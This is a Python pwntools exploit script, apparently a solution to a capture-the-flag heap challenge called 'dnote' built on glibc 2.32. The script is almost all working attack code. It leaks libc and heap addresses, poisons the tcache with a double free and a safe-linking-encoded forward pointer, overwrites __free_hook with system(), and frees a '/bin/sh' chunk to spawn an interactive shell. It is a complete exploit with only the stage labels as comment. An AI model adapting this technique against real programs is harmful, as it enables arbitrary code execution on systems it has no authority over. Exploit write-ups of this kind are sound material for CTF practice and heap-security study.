#!/usr/bin/env python3

from pwn import *

exe = ELF("./dnote_patched", checksec=False)
libc = ELF("./libc-2.32.so", checksec=False)
ld = ELF("./ld-2.32.so", checksec=False)

context.binary = exe
context.log_level = 'debug'

def add(idx, size, data):
    p.sendlineafter('>> ', b'1')
    p.sendlineafter('no : ', str(idx).encode())
    p.sendlineafter('size : ', str(size).encode())
    p.sendlineafter('Name : ', data)

def show(idx):
    p.sendlineafter('>> ', b'2')
    p.sendlineafter('no : ', str(idx).encode())
    return p.recvuntil(b'\n', drop=True)

def free(idx):
    p.sendlineafter('>> ', b'3')
    p.sendlineafter('no : ', str(idx).encode())

p=process('./dnote_patched')
# p = connect('chall.nitdgplug.org', 30094)

########################################
### Stage 1: Leak main arena address ###
########################################
add(0, 0x1000, '{}'.format(0).encode()*8)
add(1, 0x10, '{}'.format(1).encode()*8)
free(0)

add(2, 0x1100, '{}'.format(2).encode()*8)

libc.address = u64(show(0).ljust(8, b'\x00')) - 0x1c5220
log.success("Libc base: " + hex(libc.address))

##################################
### Stage 2: Leak heap address ###
##################################
add(0, 0x10, '{}'.format(0).encode()*8)
free(0)

heap = u64(show(0).ljust(8, b'\x00')) << 12
log.success("Heap base: " + hex(heap))

add(0, 0x10, '{}'.format(0).encode()*8)

##########################################
### Stage 3: Overwrite forward pointer ###
##########################################
for i in range(7):
    add(i, 0x100, '{}'.format(i).encode()*8)
add(7, 0x100, '{}'.format(7).encode()*8)
add(8, 0x100, '{}'.format(8).encode()*8)
add(9, 0x10, '{}'.format(9).encode()*8)

for i in range(7):
    free(i)
free(8)
free(7)
add(20, 0x100, b'testtest')
free(8)

fake_fw_pointer = ((heap + 0xb40) >> 12) ^ (libc.sym['__free_hook'])
payload = b'\x00'*0x100                 # Padding to tcache
payload += flat(0, 0x111)               # Prev_size and size of tcache
payload += flat(fake_fw_pointer)        # Overwrite forward pointer
add(10, 0x130, payload)

######################################################
### Stage 4: Overwrite `__free_hook` with system() ###
######################################################
add(11, 0x100, b'/bin/sh')
add(12, 0x100, p64(libc.sym['system']))

free(11)

p.interactive()